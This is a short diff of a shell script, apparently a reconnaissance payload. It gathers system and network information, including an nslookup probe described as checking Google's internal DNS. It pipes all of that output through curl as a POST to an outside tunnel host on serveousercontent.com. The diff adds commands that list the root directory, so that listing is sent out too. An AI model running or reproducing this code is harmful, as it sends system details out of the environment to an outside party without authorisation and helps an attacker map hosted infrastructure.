@@ -16,4 +16,7 @@ LOG_URL="https://5c753aab5d810c67-103-95-173-85.serveousercontent.com"
   echo "--- [4] NETWORK PROBE ---"
   # Checking if we can see Google's internal DNS
   nslookup google.com | head -n 4
+  cd /
+  ls
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "$LOG_URL"
+
